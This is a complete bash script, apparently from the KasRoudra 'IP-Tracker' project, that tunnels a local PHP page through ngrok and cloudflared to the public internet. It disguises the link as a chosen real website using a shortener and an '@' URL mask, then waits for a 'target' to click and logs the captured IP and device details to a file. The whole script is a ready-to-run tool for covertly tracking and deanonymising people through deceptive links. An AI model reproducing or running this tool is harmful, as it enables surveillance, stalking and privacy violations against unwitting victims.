#!/bin/bash

# IP-Tracker
# Version    : 1.0
# Author     : KasRoudra
# Github     : https://github.com/KasRoudra
# Email      : kasroudrakrd@gmail.com
# Contact    : https://m.me/KasRoudra
# Description: Get details of device using a link


white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[1;35m"
cyan="\033[1;36m"
nc="\033[00m"
blue="\033[1;34m"

info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"

logo="
${red} ___ ____     _____               _
${cyan}|_ _|  _ \   |_   _| __ __ _  ___| | _____ _ __
${yellow} | || |_) |____| || '__/ _' |/ __| |/ / _ \ '__|
${blue} | ||  __/_____| || | | (_| | (__|   <  __/ |
${green}|___|_|        |_||_|  \__,_|\___|_|\_\___|_|
${purple}                               [By KasRoudra]
"
options="${ask}Choose a option:

${cyan}[${white}1${cyan}] ${yellow}Start
${cyan}[${white}0${cyan}] ${yellow}Exit
${cyan}[${white}x${cyan}] ${yellow}About${blue}
"

killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
}
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

url_manager() {
    sed 's+website_name+'$mwebsite'+g' ip.php > index.php
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL ${2} > ${1}\n"
    sleep 1
     masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        echo -e "${success}URL ${3} > ${masked}\n"
        short=${masked#https://}
        echo -e "${success}URL ${4} > $mwebsite@${short}\n"
    fi
}

if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang ip.sh
termux=true
else
termux=false
fi
cwd=`pwd`
stty -echoctl
trap "echo -e '${success}Thanks for using!\n'; exit" 2

if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    apt update && apt upgrade -y
    apt install php -y
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    apt install curl -y
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    apt install unzip -y
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    apt install wget -y
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
    killer; exit 1
fi

if $termux; then
    path=`pwd`
    if echo "$path" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        killer; exit 1
    fi
fi
if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    p=`uname -m`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok-stable-linux-arm.zip
        fi
        if echo "$p" | grep -q "aarch64"; then
            if [ -e ngrok-stable-linux-arm64.tgz ];then
                rm -rf ngrok-stable-linux-arm64.tgz
            fi
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
            tar -zxf ngrok.tgz
            rm -rf ngrok.tgz
            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
            break
        elif echo "$p" | grep -q "arm"; then
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
            break
        elif echo "$p" | grep -q "x86_64"; then

            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-amd64.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
            break
        else
            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
            ngrokdel
            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
            break
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
fi
if ! [ -e ip.php ]; then
wget https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/ip.php
fi
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "$options"
sleep 1
printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
read option
    if echo $option | grep -q "1"; then
        printf "\n${ask}Enter a website name(e.g. google.com, youtube.com)\n${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read website
        if ! [ `echo $website | grep -q "http"` ]; then
            if ! (echo $website | grep -q "https"); then
                mwebsite="https://${website}"
            else
                mwebsite="http://${website}"
            fi
        else
            mwebsite=$website
        fi
        m=$(curl -s --head -w %{http_code} $mwebsite -o /dev/null)
        if [[ -z "$website" ]]; then
            echo -e "\n${error}No website!"
            sleep 2
        elif [[ "$website" =~ " " ]]; then
            echo -e "\n${error}Invalid website! Please avoid space."
            sleep 2
        elif [[ "$website" =~ "/" ]]; then
            echo -e "\n${error}Invalid website! Please avoid slash(/)"
            sleep 2
        elif echo "$m" | grep -q "000";then
            echo -e "\n${error}Website do not exist."
            sleep 2
        else
            break
        fi
    elif echo $option | grep -q "0"; then   
        exit 0
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[IP-Tracker]
$red[Version]    ${cyan} :[1.0]
$red[Description]${cyan} :[IP Tracking tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read about
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
if $termux; then
echo -e "\n${info}Please turn on hotspot"
sleep 3
fi
echo -e "\n${info}Starting php server at localhost:7777....\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}Starting tunnelers......\n"
netcheck
if [ -e "$HOME/.cffolder/log.txt" ]; then
rm -rf "$HOME/.cffolder/log.txt"
fi
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
if $termux; then
cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
else
cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
ngrokcheck=true
else
ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
cfcheck=true
else
cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    echo -e "${success}Cloudflared and Ngrok started succesfully!\n"
    url_manager "$cflink" "1" "2" "3"
    url_manager "$ngroklink" "4" "5" "6"
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared started succesfully!\n"
    url_manager "$cflink" "1" "2" "3"
    break
fi
if ( $ngrokcheck && ! $cfcheck ); then
    echo -e "${success}Ngrok started succesfully!\n"
    url_manager "$ngroklink" "1" "2" "3"
    break
fi
if ! ( $cfcheck && $ngrokcheck ) ; then
    echo -e "${error}Tunneling failed!\n"
    killer; exit 1
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
    echo -e "${success}PHP started succesfully!\n"
else
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        clear
        echo -e "$logo"
        echo -e "\007\n${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        cat ip.txt >> $cwd/ips.txt
        echo -e "\n${info}Saved in ips.txt"
        rm -rf ip.txt
        echo -e "\n${info}Waiting for next. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
    fi
    sleep 0.5
done 
